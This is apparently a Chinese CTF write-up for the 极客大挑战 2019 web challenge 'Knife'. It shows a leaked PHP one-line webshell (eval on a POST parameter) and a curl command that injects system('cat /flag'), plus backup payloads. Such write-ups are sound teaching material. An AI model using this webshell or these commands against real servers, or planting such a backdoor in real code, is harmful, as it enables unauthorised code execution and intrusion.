---
title: 极客大挑战 2019 - Web - Knife
date: 2026-11-15 00:40:00
categories:
  - CTF
  - 极客大挑战 2019
  - Web
tags:
  - 一句话木马
  - 命令执行
  - RCE
cover: /img/cover/silver-hair-blue-eyes-girl.jpg
description: 极客大挑战 2019 的 Web 签到题，首页源码直接泄露一句话木马 eval 后门，向参数注入 PHP 代码即可执行命令读取 flag，考查对一句话木马后门的识别与利用。
keywords:
  - 一句话木马
  - eval
  - RCE
  - 命令执行
  - 极客大挑战
ai: >-
  本题是极客大挑战 2019 的 Web 签到题，考查一句话木马后门的识别与利用。访问首页查看源码即可在 HTML 注释或脚本中看到被泄露的后门代码 eval($_POST["Syc"])，即攻击者向 POST 参数 Syc 注入任意 PHP 代码都会被直接执行。利用时直接向首页 POST 提交 Syc=system('cat /flag') 即可在响应中回显 flag。题目难度极低，核心是提示读者注意源码泄露的一句话说木马后门，以及 eval 函数将用户输入当作代码执行的危害。
copyright_author: Microsoft Xiaoice's
---

> 结论先行：首页源码直接泄露一句话木马 `eval($_POST["Syc"]);`，向 `Syc` 参数 POST 注入 PHP 代码即可执行命令，`system('cat /flag')` 直接读出 flag。

## 题目信息

| 项 | 内容 |
|---|---|
| 比赛 | 极客大挑战 2019 |
| 方向 | Web |
| 难度 | 简单 |
| 环境 | 授权靶场（已脱敏） |

知识点：一句话木马、`eval` 后门、命令执行。

## 信息收集

访问首页，查看源码，发现泄露的一句话木马后门：

```php
<?php @eval($_POST["Syc"]); ?>
```

`eval` 会把 `Syc` 参数的内容当作 PHP 代码执行，没有任何过滤。

## 漏洞分析

后端将用户 POST 参数 `Syc` 的值直接交给 `eval` 执行。`eval` 是 PHP 中执行任意代码的危险函数，一旦能控制其入参即等价于代码执行（RCE）。此题把后门直接写在首页源码里泄露出来，属于典型的一句话木马后门。

## 利用过程

### 1. 注入 `system('cat /flag')`

```bash
curl -X POST "http://TARGET/" --data "Syc=system('cat /flag');"
```

`system` 执行系统命令并把结果回显到响应中，`cat /flag` 读取根目录下的 flag 文件。

### 2. 页面回显 flag

响应中直接输出 flag。

## 完整 EXP

```bash
curl -X POST "http://TARGET/" \
  --data "Syc=system('cat /flag');"
```

## Flag

```
CTF2{c628471f-****-****-****-**********}
```

（真实 flag 已脱敏，完整值记录于本地 wp/payload 存档。）

## 踩坑与总结

- 一句话木马通常藏在首页源码、注释或可疑文件中，做题时先 `view-source` 看一遍源码。
- `eval` 直接把用户输入当代码执行，是 RCE 的最直接入口，利用时无需任何绕过。
- 备用 payload：`Syc=system('ls /')`、`Syc=phpinfo()`。
